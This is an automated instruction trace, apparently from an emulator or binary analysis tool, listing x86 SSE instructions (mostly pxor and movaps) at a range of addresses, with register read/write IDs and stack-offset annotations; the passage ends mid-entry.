0x431239: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43123d: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x431240: movaps xmm2, xmm7, regs_read: [129], regs_write: [124] 0x431250: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x431253: pxor xmm2, xmmword ptr [ebp - 0x170], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x43125b: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43125f: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x431263: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x431269: pop edi, regs_read: [30], regs_write: [30, 23] 0x431273: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x43127a: pop esi, regs_read: [30], regs_write: [30, 29] 0x43127f: movaps xmm2, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x4 and offset 0x7f40 for stack size 0x10000 0x431286: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x43128a: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x43128e: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x431297: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x4312a4: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x4312b8: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x4312bc: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x4312c8: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x4312d2: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x4312d4: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4312d5: mov esp, ebx, regs_read: [21], regs_write: [30] 0x4312d7: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4312e0: push ebx, regs_read: [30, 21], regs_write: [30] 0x4312e1: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x4312ec: push ebp, regs_read: [30, 20], regs_write: [30] 0x4312ed: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x4312f0: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x4312f4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4312fc: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x4312ff: mov ecx, dword ptr [ebx + 8], regs_read: [21], regs_write: [22] 0x431320: movaps xmmword ptr [ebp - 0x180], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x43132f: movaps xmmword ptr [ebp - 0x1e0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x43133a: movaps xmmword ptr [ebp - 0x150], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x431345: pxor xmm0, xmmword ptr [0x4c9d60], regs_read: [122], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x4d1d60 for stack size 0x10000 0x431351: movaps xmmword ptr [ebp - 0x120], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x431360: movaps xmmword ptr [ebp - 0x130], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x43136b: movaps xmmword ptr [ebp - 0x140], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x431372: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431376: movaps xmmword ptr [ebp - 0x190], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x431386: movaps xmmword ptr [ebp - 0x80], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x43138a: pxor xmm0, xmmword ptr [0x4c9d70], regs_read: [122], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x4d1d70 for stack size 0x10000 0x431392: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43139b: movaps xmm0, xmmword ptr [0x4c9d40], regs_read: (), regs_write: [122] 0x4313a6: movaps xmmword ptr [ebp - 0x70], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x4313aa: movaps xmm1, xmmword ptr [0x4c9d50], regs_read: (), regs_write: [123] 0x4313b5: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4313b8: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4313bc: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x4313c8: pxor xmm2, xmm6, regs_read: [124, 128], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4313dc: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x4313df: movaps xmmword ptr [ebp - 0x1f0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x4313fa: movaps xmm5, xmm6, regs_read: [128], regs_write: [127] 0x4313fd: movaps xmmword ptr [ebp - 0xf0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x431404: movaps xmm6, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x43140c: movaps xmm4, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x431414: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431418: movaps xmmword ptr [ebp - 0xb0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x431428: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431435: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x43143d: movaps xmmword ptr [ebp - 0x80], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x431441: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x431448: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43144c: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x43144f: movaps xmmword ptr [ebp - 0x110], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x431456: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43145a: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x43145d: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431472: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431476: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431482: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x431486: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x43149a: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x4314a1: movaps xmmword ptr [ebp - 0x1a0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x4314b0: movaps xmmword ptr [ebp - 0x170], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x4314c1: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x4314d4: movaps xmmword ptr [ebp - 0x1b0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x4314db: movaps xmm1, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x4314df: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4314ee: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4314f7: movaps xmmword ptr [ebp - 0x80], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x431500: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431503: movaps xmmword ptr [ebp - 0x70], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x431507: movaps xmm1, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x43151b: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431522: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431526: movaps xmm5, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7e90 for stack size 0x10000 0x43152d: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x43153d: movaps xmmword ptr [ebp - 0x100], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x43154c: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431561: movaps xmmword ptr [ebp - 0x1c0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x431568: movaps xmm3, xmmword ptr [ebp - 0x1c0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7e40 for stack size 0x10000 0x43156f: movaps xmm6, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x431577: movaps xmm4, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x43157f: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431583: movaps xmmword ptr [ebp - 0xb0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x431593: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4315a0: movaps xmmword ptr [ebp - 0x80], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x4315a8: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x4315ab: movaps xmmword ptr [ebp - 0x70], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x4315b3: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x4315b6: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4315ba: movaps xmmword ptr [ebp - 0x110], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x4315c1: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4315c4: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4315c8: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x4315d4: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4315d8: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4315e4: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4315e8: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4315f1: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4315ff: movaps xmm2, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x431603: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x43161b: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x43161e: movaps xmmword ptr [ebp - 0x160], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x431631: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431635: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x431640: movaps xmmword ptr [ebp - 0x170], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x431658: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43165c: movaps xmmword ptr [ebp - 0x70], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x431665: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x43166c: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x43167c: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431683: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431690: movaps xmm5, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x431694: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x43169b: movaps xmmword ptr [ebp - 0x80], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x4316a7: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4316be: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x4316c1: movaps xmmword ptr [ebp - 0x110], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x4316c8: movaps xmm6, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x4316d0: movaps xmm4, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4316d8: pxor xmm4, xmm3, regs_read: [126, 125], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4316dc: movaps xmmword ptr [ebp - 0xb0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x4316ec: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4316f9: movaps xmmword ptr [ebp - 0x10], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4316fd: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x431701: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x431708: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x43170f: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x431713: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431716: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x43171c: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431720: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431724: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431730: movaps xmmword ptr [ebp - 0x1d0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x431737: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x431748: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43174c: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x43174f: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431753: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x431762: movaps xmm2, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x431766: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x43178b: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43178f: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x431792: movaps xmmword ptr [ebp - 0x70], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x4317ab: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4317af: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4317b8: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4317bc: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4317c3: movaps xmm1, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x4317d0: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4317d7: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4317db: movaps xmm5, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x4317df: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x4317ef: movaps xmmword ptr [ebp - 0xb0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x4317fa: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43180b: movaps xmmword ptr [ebp - 0xc0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x431816: movaps xmm6, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x431821: movaps xmmword ptr [ebp - 0xc0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x431828: movaps xmm3, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x43182f: movaps xmm6, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x431837: movaps xmm4, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x43183f: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431843: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x431850: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43185d: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x431860: movaps xmmword ptr [ebp - 0x10], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431868: movaps xmmword ptr [ebp - 0x40], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x431870: movaps xmmword ptr [ebp - 0x30], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x431874: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431877: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x43187e: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431882: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431886: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x431889: movaps xmm2, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x431896: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43189a: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4318a6: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4318aa: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4318b9: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x4318c0: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x4318eb: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4318f3: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x43190b: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431921: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431924: movaps xmmword ptr [ebp - 0x40], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x431936: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x43193a: movaps xmm6, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x43193e: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431941: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431945: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x43195a: movaps xmm5, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x43195e: movaps xmm3, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x431962: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431977: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431984: pxor xmm6, xmm4, regs_read: [128, 126], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431988: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x431999: movaps xmmword ptr [ebp - 0x40], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4319a1: movaps xmmword ptr [ebp - 0x10], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4319a5: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4319ac: movaps xmmword ptr [ebp - 0x30], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4319b4: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4319b8: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x4319bb: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4319bf: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4319c2: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x4319e1: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4319e5: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4319f8: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 